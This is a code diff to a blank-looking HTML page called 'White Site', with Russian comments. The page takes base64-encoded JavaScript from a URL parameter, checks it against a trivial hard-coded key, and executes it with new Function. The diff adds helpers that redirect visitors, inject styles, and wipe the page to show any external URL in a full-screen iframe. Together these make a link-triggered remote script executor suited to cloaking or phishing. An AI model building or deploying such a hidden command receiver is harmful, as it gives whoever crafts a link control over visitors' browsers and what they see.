@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>White Site - Command Receiver</title>
+    <title>White Site - Script Executor</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: white; min-height: 100vh; padding: 40px 20px; }
@@ -21,41 +21,28 @@
         // НАСТРОЙКИ
         // ==========================================
         var SECRET_KEY = "1";
+        var ORIGINAL_HTML = document.body.innerHTML;
         
         // ==========================================
-        // ФУНКЦИИ ДЛЯ ВЫВОДА
+        // ФУНКЦИЯ СБРОСА
         // ==========================================
-        function showMessage(text, isError) {
-            var outputDiv = document.getElementById('output');
+        function resetSite() {
+            document.getElementById('output').innerHTML = '';
             var line = document.createElement('div');
-            line.textContent = text;
-            if (isError) {
-                line.style.color = '#ff0000';
-            } else {
-                line.style.color = '#000000';
-            }
-            outputDiv.appendChild(line);
-        }
-        
-        function clearOutput() {
-            document.getElementById('output').innerHTML = '';
-        }
-        
-        function resetAll() {
-            document.getElementById('output').innerHTML = '';
-            showMessage('Site has been reset', false);
+            line.textContent = 'Site has been reset';
+            line.style.color = '#000000';
+            document.getElementById('output').appendChild(line);
         }
         
         // ==========================================
-        // API ДЛЯ ВЫПОЛНЕНИЯ КОМАНД
+        // API ДЛЯ СКРИПТОВ
         // ==========================================
         var api = {
             log: function(msg) {
-                var outputDiv = document.getElementById('output');
                 var line = document.createElement('div');
                 line.textContent = msg;
                 line.style.color = '#000000';
-                outputDiv.appendChild(line);
+                document.getElementById('output').appendChild(line);
             },
             clear: function() {
                 document.getElementById('output').innerHTML = '';
@@ -64,38 +51,65 @@
                 document.getElementById('output').innerHTML = htmlCode;
             },
             reset: function() {
-                document.getElementById('output').innerHTML = '';
-                showMessage('Site reset by command', false);
+                resetSite();
+            },
+            style: function(css) {
+                var style = document.createElement('style');
+                style.textContent = css;
+                document.head.appendChild(style);
+            },
+            title: function(t) {
+                document.title = t;
+            },
+            bg: function(color) {
+                document.body.style.backgroundColor = color;
+            },
+            redirect: function(url) {
+                window.location.href = url;
+            },
+            iframe: function(url) {
+                var iframe = document.createElement('iframe');
+                iframe.src = url;
+                iframe.style.position = 'fixed';
+                iframe.style.top = '0';
+                iframe.style.left = '0';
+                iframe.style.width = '100%';
+                iframe.style.height = '100%';
+                iframe.style.border = 'none';
+                document.body.innerHTML = '';
+                document.body.appendChild(iframe);
+            },
+            alert: function(msg) {
+                alert(msg);
             }
         };
         
         // ==========================================
-        // ВЫПОЛНЕНИЕ JAVASCRIPT КОДА
+        // ВЫПОЛНЕНИЕ СКРИПТА
         // ==========================================
-        function executeJavaScript(code) {
+        function executeScript(scriptCode) {
             try {
-                var func = new Function('api', code);
+                var func = new Function('api', scriptCode);
                 func(api);
-                return { success: true, error: null };
+                return true;
             } catch(e) {
-                return { success: false, error: e.message };
+                return false;
             }
         }
         
         // ==========================================
-        // ДЕКОДИРОВАНИЕ BASE64
+        // ДЕКОДИРОВАНИЕ
         // ==========================================
         function decodeBase64(encoded) {
             try {
-                var decoded = atob(encoded);
-                return decoded;
+                return atob(encoded);
             } catch(e) {
                 return null;
             }
         }
         
         // ==========================================
-        // ПОЛУЧЕНИЕ ПАРАМЕТРОВ ИЗ URL
+        // ПОЛУЧЕНИЕ ПАРАМЕТРОВ
         // ==========================================
         function getUrlParams() {
             var params = {};
@@ -113,71 +127,39 @@
         }
         
         // ==========================================
-        // ПОКАЗ СТРАНИЦЫ С РЕЗУЛЬТАТОМ
+        // ГЛАВНАЯ ФУНКЦИЯ
         // ==========================================
-        function showResultPage(title, message, isError) {
-            var container = document.querySelector('.container');
-            var color = isError ? '#ff0000' : '#008000';
-            container.innerHTML = '<div style="text-align:center;padding:50px;"><h2 style="color:' + color + ';">' + title + '</h2><p>' + message + '</p><br><a href="." style="color:#0066cc;">← Back to site</a></div>';
-        }
-        
-        // ==========================================
-        // ГЛАВНАЯ ФУНКЦИЯ - ПРИЁМ КОМАНД
-        // ==========================================
-        function receiveCommand() {
+        function init() {
             var params = getUrlParams();
             
-            // Проверка: есть ли вообще параметры
-            if (Object.keys(params).length === 0) {
+            if (!params.key && !params.cmd && !params.action) {
                 return;
             }
             
-            // Проверка: есть ли ключ
-            if (!params.key) {
-                showResultPage('ERROR', 'Missing API key', true);
-                return;
-            }
-            
-            // Проверка: правильный ли ключ
             if (params.key !== SECRET_KEY) {
-                showResultPage('ERROR', 'Invalid API key: ' + params.key, true);
+                document.body.innerHTML = '<h3>Wrong API key</h3><a href=".">Back</a>';
                 return;
             }
             
-            // Обработка: сброс сайта
             if (params.action === 'reset') {
-                resetAll();
-                showResultPage('SUCCESS', 'Site has been reset to default', false);
+                resetSite();
+                document.body.innerHTML = '<h3>Site reset</h3><a href=".">Back</a>';
                 return;
             }
             
-            // Обработка: выполнение команды
             if (params.cmd) {
-                var decodedCommand = decodeBase64(params.cmd);
-                
-                if (decodedCommand === null) {
-                    showResultPage('ERROR', 'Failed to decode base64 command', true);
-                    return;
-                }
-                
-                var result = executeJavaScript(decodedCommand);
-                
-                if (result.success) {
-                    showResultPage('SUCCESS', 'Command executed successfully', false);
+                var decoded = decodeBase64(params.cmd);
+                if (decoded) {
+                    executeScript(decoded);
+                    document.body.innerHTML = '<h3>Script executed</h3><a href=".">Back to site</a>';
                 } else {
-                    showResultPage('ERROR', 'Execution error: ' + result.error, true);
+                    document.body.innerHTML = '<h3>Decode error</h3><a href=".">Back</a>';
                 }
                 return;
             }
-            
-            // Если ничего не подошло
-            showResultPage('ERROR', 'Unknown command format', true);
         }
         
-        // ==========================================
-        // ЗАПУСК
-        // ==========================================
-        receiveCommand();
+        init();
     </script>
 </body>
 </html>
